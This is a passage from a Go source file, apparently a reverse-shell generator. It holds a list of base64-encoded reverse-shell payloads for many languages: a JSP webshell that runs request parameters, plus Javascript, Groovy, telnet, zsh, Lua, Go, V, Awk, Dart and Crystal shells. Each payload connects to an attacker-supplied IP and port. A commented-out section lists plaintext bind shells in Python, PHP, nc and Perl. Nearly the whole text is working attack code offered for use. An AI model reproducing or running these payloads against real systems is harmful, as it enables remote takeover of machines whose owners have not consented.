gc2hlbGxQYXRoID0gbnVsbDsNCiAgICB0cnkNCiAgICB7DQogICAgICAgIGlmIChTeXN0ZW0uZ2V0UHJvcGVydHkoIm9zLm5hbWUiKS50b0xvd2VyQ2FzZSgpLmluZGV4T2YoIndpbmRvd3MiKSA9PSAtMSkgew0KICAgICAgICAgICAgc2hlbGxQYXRoID0gbmV3IFN0cmluZygiL2Jpbi9zaCIpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgc2hlbGxQYXRoID0gbmV3IFN0cmluZygiY21kLmV4ZSIpOw0KICAgICAgICB9DQogICAgfSBjYXRjaCggRXhjZXB0aW9uIGUgKXt9DQogICAgLy8gSU5ORVIgSFRNTCBQQVJUDQogICAgaWYgKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJzaGVsbCIpICE9IG51bGwpIHsNCiAgICAgICAgb3V0LnByaW50bG4oIkNvbW1hbmQ6ICIgKyByZXF1ZXN0LmdldFBhcmFtZXRlcigic2hlbGwiKSArICJcbjxCUj4iKTsNCiAgICAgICAgUHJvY2VzcyBwOw0KICAgICAgICBpZiAoc2hlbGxQYXRoLmVxdWFscygiY21kLmV4ZSIpKQ0KICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNtZC5leGUgL2MgIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJzaGVsbCIpKTsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoIi9iaW4vc2ggLWMgIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJzaGVsbCIpKTsNCiAgICAgICAgT3V0cHV0U3RyZWFtIG9zID0gcC5nZXRPdXRwdXRTdHJlYW0oKTsNCiAgICAgICAgSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7DQogICAgICAgIERhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsNCiAgICAgICAgU3RyaW5nIGRpc3IgPSBkaXMucmVhZExpbmUoKTsNCiAgICAgICAgd2hpbGUgKCBkaXNyICE9IG51bGwgKSB7DQogICAgICAgICAgICBvdXQucHJpbnRsbihkaXNyKTsNCiAgICAgICAgICAgIGRpc3IgPSBkaXMucmVhZExpbmUoKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICAvLyBUQ1AgUE9SVCBQQVJUDQogICAgY2xhc3MgU3RyZWFtQ29ubmVjdG9yIGV4dGVuZHMgVGhyZWFkDQogICAgew0KICAgICAgICBJbnB1dFN0cmVhbSB3ejsNCiAgICAgICAgT3V0cHV0U3RyZWFtIHlyOw0KICAgICAgICBTdHJlYW1Db25uZWN0b3IoIElucHV0U3RyZWFtIHd6LCBPdXRwdXRTdHJlYW0geXIgKSB7DQogICAgICAgICAgICB0aGlzLnd6ID0gd3o7DQogICAgICAgICAgICB0aGlzLnlyID0geXI7DQogICAgICAgIH0NCiAgICAgICAgcHVibGljIHZvaWQgcnVuKCkNCiAgICAgICAgew0KICAgICAgICAgICAgQnVmZmVyZWRSZWFkZXIgciAgPSBudWxsOw0KICAgICAgICAgICAgQnVmZmVyZWRXcml0ZXIgdyA9IG51bGw7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByICA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIod3opKTsNCiAgICAgICAgICAgICAgICB3ID0gbmV3IEJ1ZmZlcmVkV3JpdGVyKG5ldyBPdXRwdXRTdHJlYW1Xcml0ZXIoeXIpKTsNCiAgICAgICAgICAgICAgICBjaGFyIGJ1ZmZlcltdID0gbmV3IGNoYXJbODE5Ml07DQogICAgICAgICAgICAgICAgaW50IGxlbmd0aDsNCiAgICAgICAgICAgICAgICB3aGlsZSggKCBsZW5ndGggPSByLnJlYWQoIGJ1ZmZlciwgMCwgYnVmZmVyLmxlbmd0aCApICkgPiAwICkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHcud3JpdGUoIGJ1ZmZlciwgMCwgbGVuZ3RoICk7DQogICAgICAgICAgICAgICAgICAgIHcuZmx1c2goKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGNhdGNoKCBFeGNlcHRpb24gZSApe30NCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmKCByICE9IG51bGwgKQ0KICAgICAgICAgICAgICAgICAgICByLmNsb3NlKCk7DQogICAgICAgICAgICAgICAgaWYoIHcgIT0gbnVsbCApDQogICAgICAgICAgICAgICAgICAgIHcuY2xvc2UoKTsNCiAgICAgICAgICAgIH0gY2F0Y2goIEV4Y2VwdGlvbiBlICl7fQ0KICAgICAgICB9DQogICAgfQ0KIA0KICAgIHRyeSB7DQogICAgICAgIFNvY2tldCBzb2NrZXQgPSBuZXcgU29ja2V0KCAie3suSXB9fSIsIHt7LlBvcnR9fSApOyAvLyBSZXBsYWNlIHdpdGggd2FudGVkIGlwIGFuZCBwb3J0DQogICAgICAgIFByb2Nlc3MgcHJvY2VzcyA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoIHNoZWxsUGF0aCApOw0KICAgICAgICBuZXcgU3RyZWFtQ29ubmVjdG9yKHByb2Nlc3MuZ2V0SW5wdXRTdHJlYW0oKSwgc29ja2V0LmdldE91dHB1dFN0cmVhbSgpKS5zdGFydCgpOw0KICAgICAgICBuZXcgU3RyZWFtQ29ubmVjdG9yKHNvY2tldC5nZXRJbnB1dFN0cmVhbSgpLCBwcm9jZXNzLmdldE91dHB1dFN0cmVhbSgpKS5zdGFydCgpOw0KICAgICAgICBvdXQucHJpbnRsbigicG9ydCBvcGVuZWQgb24gIiArIHNvY2tldCk7DQogICAgIH0gY2F0Y2goIEV4Y2VwdGlvbiBlICkge30NCiU+DQo8L3ByZT4NCjwvYm9keT4NCjwvaHRtbD4=",
		[]string{"windows", "linux", "mac"},
	},
	{
		"Javascript",
		"U3RyaW5nIGNvbW1hbmQgPSAidmFyIGhvc3QgPSAne3suSXB9fSc7IiArDQogICAgICAgICAgICAgICAgICAgICAgICJ2YXIgcG9ydCA9IHt7LlBvcnR9fTsiICsNCiAgICAgICAgICAgICAgICAgICAgICAgInZhciBjbWQgPSAne3suU2hlbGx9fSc7IisNCiAgICAgICAgICAgICAgICAgICAgICAgInZhciBzID0gbmV3IGphdmEubmV0LlNvY2tldChob3N0LCBwb3J0KTsiICsNCiAgICAgICAgICAgICAgICAgICAgICAgInZhciBwID0gbmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihjbWQpLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkuc3RhcnQoKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAidmFyIHBpID0gcC5nZXRJbnB1dFN0cmVhbSgpLCBwZSA9IHAuZ2V0RXJyb3JTdHJlYW0oKSwgc2kgPSBzLmdldElucHV0U3RyZWFtKCk7IisNCiAgICAgICAgICAgICAgICAgICAgICAgInZhciBwbyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCksIHNvID0gcy5nZXRPdXRwdXRTdHJlYW0oKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAicHJpbnQgKCdDb25uZWN0ZWQnKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAid2hpbGUgKCFzLmlzQ2xvc2VkKCkpIHsiKw0KICAgICAgICAgICAgICAgICAgICAgICAiICAgIHdoaWxlIChwaS5hdmFpbGFibGUoKSA+IDApIisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICAgICAgc28ud3JpdGUocGkucmVhZCgpKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAiICAgIHdoaWxlIChwZS5hdmFpbGFibGUoKSA+IDApIisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICAgICAgc28ud3JpdGUocGUucmVhZCgpKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAiICAgIHdoaWxlIChzaS5hdmFpbGFibGUoKSA+IDApIisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICAgICAgcG8ud3JpdGUoc2kucmVhZCgpKTsiKw0KICAgICAgICAgICAgICAgICAgICAgICAiICAgIHNvLmZsdXNoKCk7IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICBwby5mbHVzaCgpOyIrDQogICAgICAgICAgICAgICAgICAgICAgICIgICAgamF2YS5sYW5nLlRocmVhZC5zbGVlcCg1MCk7IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICB0cnkgeyIrDQogICAgICAgICAgICAgICAgICAgICAgICIgICAgICAgIHAuZXhpdFZhbHVlKCk7IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICAgICAgYnJlYWs7IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICB9IisNCiAgICAgICAgICAgICAgICAgICAgICAgIiAgICBjYXRjaCAoZSkgeyIrDQogICAgICAgICAgICAgICAgICAgICAgICIgICAgfSIrDQogICAgICAgICAgICAgICAgICAgICAgICJ9IisNCiAgICAgICAgICAgICAgICAgICAgICAgInAuZGVzdHJveSgpOyIrDQogICAgICAgICAgICAgICAgICAgICAgICJzLmNsb3NlKCk7IjsNClN0cmluZyB4ID0gIlwiXCIuZ2V0Q2xhc3MoKS5mb3JOYW1lKFwiamF2YXguc2NyaXB0LlNjcmlwdEVuZ2luZU1hbmFnZXJcIikubmV3SW5zdGFuY2UoKS5nZXRFbmdpbmVCeU5hbWUoXCJKYXZhU2NyaXB0XCIpLmV2YWwoXCIiK2NvbW1hbmQrIlwiKSI7DQpyZWYuYWRkKG5ldyBTdHJpbmdSZWZBZGRyKCJ4IiwgeCk7",
		[]string{"linux", "mac", "windows"},
	},
	{
		"Groovy",
		"U3RyaW5nIGhvc3Q9Int7LklwfX0iO2ludCBwb3J0PXt7LlBvcnR9fTtTdHJpbmcgY21kPSJ7ey5TaGVsbH19IjtQcm9jZXNzIHA9bmV3IFByb2Nlc3NCdWlsZGVyKGNtZCkucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKS5zdGFydCgpO1NvY2tldCBzPW5ldyBTb2NrZXQoaG9zdCxwb3J0KTtJbnB1dFN0cmVhbSBwaT1wLmdldElucHV0U3RyZWFtKCkscGU9cC5nZXRFcnJvclN0cmVhbSgpLCBzaT1zLmdldElucHV0U3RyZWFtKCk7T3V0cHV0U3RyZWFtIHBvPXAuZ2V0T3V0cHV0U3RyZWFtKCksc289cy5nZXRPdXRwdXRTdHJlYW0oKTt3aGlsZSghcy5pc0Nsb3NlZCgpKXt3aGlsZShwaS5hdmFpbGFibGUoKT4wKXNvLndyaXRlKHBpLnJlYWQoKSk7d2hpbGUocGUuYXZhaWxhYmxlKCk+MClzby53cml0ZShwZS5yZWFkKCkpO3doaWxlKHNpLmF2YWlsYWJsZSgpPjApcG8ud3JpdGUoc2kucmVhZCgpKTtzby5mbHVzaCgpO3BvLmZsdXNoKCk7VGhyZWFkLnNsZWVwKDUwKTt0cnkge3AuZXhpdFZhbHVlKCk7YnJlYWs7fWNhdGNoIChFeGNlcHRpb24gZSl7fX07cC5kZXN0cm95KCk7cy5jbG9zZSgpOw==",
		[]string{"windows"},
	},
	{
		"telnet",
		"VEY9JChta3RlbXAgLXUpO21rZmlmbyAkVEYgJiYgdGVsbmV0IHt7LklwfX0ge3suUG9ydH19IDA8JFRGIHwge3suU2hlbGx9fSAxPiRURg==",
		[]string{"linux", "mac"},
	},
	{
		"zsh",
		"enNoIC1jICd6bW9kbG9hZCB6c2gvbmV0L3RjcCAmJiB6dGNwIHt7LklwfX0ge3suUG9ydH19ICYmIHpzaCA+JiRSRVBMWSAyPiYkUkVQTFkgMD4mJFJFUExZJw==",
		[]string{"linux", "mac"},
	},
	{
		"Lua #1",
		"bHVhIC1lICJyZXF1aXJlKCdzb2NrZXQnKTtyZXF1aXJlKCdvcycpO3Q9c29ja2V0LnRjcCgpO3Q6Y29ubmVjdCgne3suSXB9fScsJ3t7LlBvcnR9fScpO29zLmV4ZWN1dGUoJ3t7LlNoZWxsfX0gLWkgPCYzID4mMyAyPiYzJyk7Ig==",
		[]string{"linux"},
	},
	{
		"Lua #2",
		"bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInt7LklwfX0iLCB7ey5Qb3J0fX0gbG9jYWwgc29ja2V0ID0gcmVxdWlyZSgic29ja2V0IikgbG9jYWwgdGNwID0gc29ja2V0LnRjcCgpIGxvY2FsIGlvID0gcmVxdWlyZSgiaW8iKSB0Y3A6Y29ubmVjdChob3N0LCBwb3J0KTsgd2hpbGUgdHJ1ZSBkbyBsb2NhbCBjbWQsIHN0YXR1cywgcGFydGlhbCA9IHRjcDpyZWNlaXZlKCkgbG9jYWwgZiA9IGlvLnBvcGVuKGNtZCwgInIiKSBsb2NhbCBzID0gZjpyZWFkKCIqYSIpIGY6Y2xvc2UoKSB0Y3A6c2VuZChzKSBpZiBzdGF0dXMgPT0gImNsb3NlZCIgdGhlbiBicmVhayBlbmQgZW5kIHRjcDpjbG9zZSgpJw==",
		[]string{"linux", "windows"},
	},
	{
		"Golang",
		"ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXtjLF86PW5ldC5EaWFsKCJ0Y3AiLCJ7ey5JcH19Ont7LlBvcnR9fSIpO2NtZDo9ZXhlYy5Db21tYW5kKCJ7ey5TaGVsbH19Iik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9JyA+IC90bXAvdC5nbyAmJiBnbyBydW4gL3RtcC90LmdvICYmIHJtIC90bXAvdC5nbw==",
		[]string{"linux", "mac", "windows"},
	},
	{
		"Vlang",
		"ZWNobyAnaW1wb3J0IG9zJyA+IC90bXAvdC52ICYmIGVjaG8gJ2ZuIG1haW4oKSB7IG9zLnN5c3RlbSgibmMgLWUge3suU2hlbGx9fSB7ey5JcH19IHt7LlBvcnR9fSAwPiYxIikgfScgPj4gL3RtcC90LnYgJiYgdiBydW4gL3RtcC90LnYgJiYgcm0gL3RtcC90LnY=",
		[]string{"linux", "mac"},
	},
	{
		"Awk",
		"YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC97ey5JcH19L3t7LlBvcnR9fSI7IHdoaWxlKDQyKSB7IGRveyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIGM7IGlmKGMpeyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfSB9IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsgfX0nIC9kZXYvbnVsbA==",
		[]string{"linux", "mac"},
	},
	{
		"Dart",
		"aW1wb3J0ICdkYXJ0OmlvJzsKaW1wb3J0ICdkYXJ0OmNvbnZlcnQnOwoKbWFpbigpIHsKICBTb2NrZXQuY29ubmVjdCgie3suSXB9fSIsIHt7LlBvcnR9fSkudGhlbigoc29ja2V0KSB7CiAgICBzb2NrZXQubGlzdGVuKChkYXRhKSB7CiAgICAgIFByb2Nlc3Muc3RhcnQoJ3t7LlNoZWxsfX0nLCBbXSkudGhlbigoUHJvY2VzcyBwcm9jZXNzKSB7CiAgICAgICAgcHJvY2Vzcy5zdGRpbi53cml0ZWxuKG5ldyBTdHJpbmcuZnJvbUNoYXJDb2RlcyhkYXRhKS50cmltKCkpOwogICAgICAgIHByb2Nlc3Muc3Rkb3V0CiAgICAgICAgICAudHJhbnNmb3JtKHV0ZjguZGVjb2RlcikKICAgICAgICAgIC5saXN0ZW4oKG91dHB1dCkgeyBzb2NrZXQud3JpdGUob3V0cHV0KTsgfSk7CiAgICAgIH0pOwogICAgfSwKICAgIG9uRG9uZTogKCkgewogICAgICBzb2NrZXQuZGVzdHJveSgpOwogICAgfSk7CiAgfSk7Cn0=",
		[]string{"linux", "mac", "windows"},
	},
	{
		"Crystal (system)",
		"Y3J5c3RhbCBldmFsICdyZXF1aXJlICJwcm9jZXNzIjtyZXF1aXJlICJzb2NrZXQiO2M9U29ja2V0LnRjcChTb2NrZXQ6OkZhbWlseTo6SU5FVCk7Yy5jb25uZWN0KCJ7ey5JcH19Iix7ey5Qb3J0fX0pO2xvb3B7bSxsPWMucmVjZWl2ZTtwPVByb2Nlc3MubmV3KG0ucnN0cmlwKCJcbiIpLG91dHB1dDpQcm9jZXNzOjpSZWRpcmVjdDo6UGlwZSxzaGVsbDp0cnVlKTtjPDxwLm91dHB1dC5nZXRzX3RvX2VuZH0n",
		[]string{"linux", "windows", "mac"},
	},
	{
		"Crystal (code)",
		"cmVxdWlyZSAicHJvY2VzcyIKcmVxdWlyZSAic29ja2V0IgoKYyA9IFNvY2tldC50Y3AoU29ja2V0OjpGYW1pbHk6OklORVQpCmMuY29ubmVjdCgie3suSXB9fSIsIHt7LlBvcnR9fSkKbG9vcCBkbyAKICBtLCBsID0gYy5yZWNlaXZlCiAgcCA9IFByb2Nlc3MubmV3KG0ucnN0cmlwKCJcbiIpLCBvdXRwdXQ6UHJvY2Vzczo6UmVkaXJlY3Q6OlBpcGUsIHNoZWxsOnRydWUpCiAgYyA8PCBwLm91dHB1dC5nZXRzX3RvX2VuZAplbmQ=",
		[]string{"linux", "mac"},
	},
}

// TODO: Base64 format these too similar to ReverseShell.
/* Commenting this for now.
var BindShellCommands = []BindShellCommand{
	{
		"Python3 Bind",
		`python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'`,
		[]string{"bind", "mac", "linux", "windows"},
	},
	{
		"PHP Bind",
		`php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'`,
		[]string{"bind", "mac", "linux", "windows"},
	},
	{
		"nc Bind",
		`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f`,
		[]string{"bind", "mac", "linux"},
	},
	{
		"Perl Bind",
		`perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'`,
		[]string{"bind", "mac", "linux"},
	},
}
*/
